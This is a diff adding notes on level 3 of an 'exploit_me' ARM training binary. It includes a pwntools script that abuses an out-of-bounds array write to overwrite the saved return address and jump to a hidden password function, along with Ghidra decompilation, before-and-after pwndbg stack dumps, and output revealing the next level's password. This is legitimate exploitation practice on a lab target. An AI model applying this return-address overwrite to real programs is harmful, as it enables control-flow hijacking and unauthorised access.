@@ -636,7 +636,153 @@ else:
 
 
 ```
+# exploit_me ARM binary - level 3:
+```
+#!/home/dvader/tools/pwntools/bin/python3
 
+from pwn import *
+
+context(arch='arm', bits=32, endian='little')
+
+if args.TMUX:
+    ''' ### enter tmux before running ### '''
+    context.terminal = ["tmux", "splitw", "-h"]
+
+
+'''
+#username = b'\x41'*12
+#username = cyclic(32)
+username = cyclic(cyclic_find(0x61616164))
+#username += b'\x90' * 4
+target_address = p32(0x112d4)
+target_address.rstrip(b'\x00')
+username += target_address
+'''
+
+
+
+arrayposition = '33'.encode()   # overwriting the return address here
+value = '70756'
+#value = p32(0xdeadbeef)            # doesn't seem to like p32(), however
+# value of 11121314 == 0xa9b2a2 and resulted in invalid address 0xa9b2a2 successful LR overwrite
+# calculated target address of 0x11464 == 70756 to hex to jump to next level password function
+
+binary_args = ['/home/dvader/exploit_me/bin/exploit', 'Velvet', arrayposition, value]
+
+gdb_commands = '''
+set debuginfod enabled off
+set exec-wrapper env -i
+#b *0x114b0
+continue
+'''
+
+context.gdb_binary = "/usr/local/bin/pwndbg"
+io = gdb.debug(binary_args, gdbscript=gdb_commands)
+
+if args.INTERACTIVE:
+    io.interactive()
+else:
+    print(io.recvall(timeout=2))
+
+
+''' Learned (LX) '''
+
+# L0 - 
+# L1 - 
+# L2 - 
+
+
+''' Remembered (RX) '''
+
+# R0 - 
+
+
+''' To Do (TX) '''
+
+# T0 - 
+
+
+
+'''
+in ghidra:
+
+void FUN_00011488(int param_1,undefined4 param_2)
+
+{
+  undefined4 auStack_88 [32];
+  
+  auStack_88[param_1] = param_2;
+  FUN_0001e5e8_printf("filling array position %d with %d\n",param_1,param_2);
+  return;
+}
+'''
+'''
+in pwndbg, stack before overwrite:
+
+pwndbg> stack 36
+00:0000│ sp  0x407ffcc0 —▸ 0x11464 ◂— push {r11, lr}
+01:0004│     0x407ffcc4 ◂— 0x21 /* '!' */
+02:0008│     0x407ffcc8 ◂— 0
+... ↓        13 skipped
+10:0040│     0x407ffd00 —▸ 0x7c438 ◂— 0xfbad2087
+11:0044│     0x407ffd04 ◂— 1
+12:0048│     0x407ffd08 ◂— 0
+13:004c│     0x407ffd0c —▸ 0x408001aa ◂— '70756'
+14:0050│     0x407ffd10 ◂— 0
+15:0054│     0x407ffd14 —▸ 0x408001aa ◂— '70756'
+16:0058│     0x407ffd18 —▸ 0x7c000 ◂— 0
+17:005c│     0x407ffd1c ◂— 0x21 /* '!' */
+18:0060│     0x407ffd20 ◂— 0x3e8
+19:0064│     0x407ffd24 —▸ 0x407fffc4 —▸ 0x4080017c ◂— '/home/dvader/exploit_me/bin/exploit'
+1a:0068│     0x407ffd28 —▸ 0x793b8 —▸ 0x104c5 ◂— movtne r7, #0x4a4a
+1b:006c│     0x407ffd2c ◂— 0
+1c:0070│     0x407ffd30 —▸ 0x407fffd8 —▸ 0x408001b0 ◂— 'COLORFGBG=15;0'
+1d:0074│     0x407ffd34 ◂— 3
+1e:0078│     0x407ffd38 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
+1f:007c│     0x407ffd3c —▸ 0x1d887 ◂— ldrhteq r0, [sp], r0
+20:0080│     0x407ffd40 ◂— 1
+21:0084│     0x407ffd44 —▸ 0x7d150 —▸ 0x7a288 —▸ 0x62f6c ◂— andeq r0, r0, r3, asr #32 /* 'C' */
+22:0088│     0x407ffd48 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
+23:008c│ r11 0x407ffd4c —▸ 0x1196c ◂— mov r0, #0
+'''
+'''
+pwndbg, after stack overwrite, where 0x11464 is the password for level 4 function:
+
+pwndbg> stack 36
+00:0000│ sp  0x407ffcc0 —▸ 0x11464 ◂— push {r11, lr}
+01:0004│     0x407ffcc4 ◂— 0x21 /* '!' */
+02:0008│     0x407ffcc8 ◂— 0
+... ↓        13 skipped
+10:0040│     0x407ffd00 —▸ 0x7c438 ◂— 0xfbad2087
+11:0044│     0x407ffd04 ◂— 1
+12:0048│     0x407ffd08 ◂— 0
+13:004c│     0x407ffd0c —▸ 0x408001aa ◂— '70756'
+14:0050│     0x407ffd10 ◂— 0
+15:0054│     0x407ffd14 —▸ 0x408001aa ◂— '70756'
+16:0058│     0x407ffd18 —▸ 0x7c000 ◂— 0
+17:005c│     0x407ffd1c ◂— 0x21 /* '!' */
+18:0060│     0x407ffd20 ◂— 0x3e8
+19:0064│     0x407ffd24 —▸ 0x407fffc4 —▸ 0x4080017c ◂— '/home/dvader/exploit_me/bin/exploit'
+1a:0068│     0x407ffd28 —▸ 0x793b8 —▸ 0x104c5 ◂— movtne r7, #0x4a4a
+1b:006c│     0x407ffd2c ◂— 0
+1c:0070│     0x407ffd30 —▸ 0x407fffd8 —▸ 0x408001b0 ◂— 'COLORFGBG=15;0'
+1d:0074│     0x407ffd34 ◂— 3
+1e:0078│     0x407ffd38 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
+1f:007c│     0x407ffd3c —▸ 0x1d887 ◂— ldrhteq r0, [sp], r0
+20:0080│     0x407ffd40 ◂— 1
+21:0084│     0x407ffd44 —▸ 0x7d150 —▸ 0x7a288 —▸ 0x62f6c ◂— andeq r0, r0, r3, asr #32 /* 'C' */
+22:0088│     0x407ffd48 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
+23:008c│ r11 0x407ffd4c —▸ 0x11464 ◂— push {r11, lr}
+'''
+'''
+└─$ ./l3.py            
+[+] Starting local process '/usr/bin/qemu-arm': pid 3028538
+[*] running in new terminal: ['/usr/local/bin/pwndbg', '-q', '-x', '/tmp/pwnlib-gdbscript-n_qsz3l3.gdb']
+[+] Receiving all data: Done (66B)
+[*] Process '/usr/bin/qemu-arm' stopped with exit code 29 (pid 3028538)
+b'filling array position 33 with 70756\nLevel 4 Password: "mysecret"\n'
+'''
+```
 
 
 
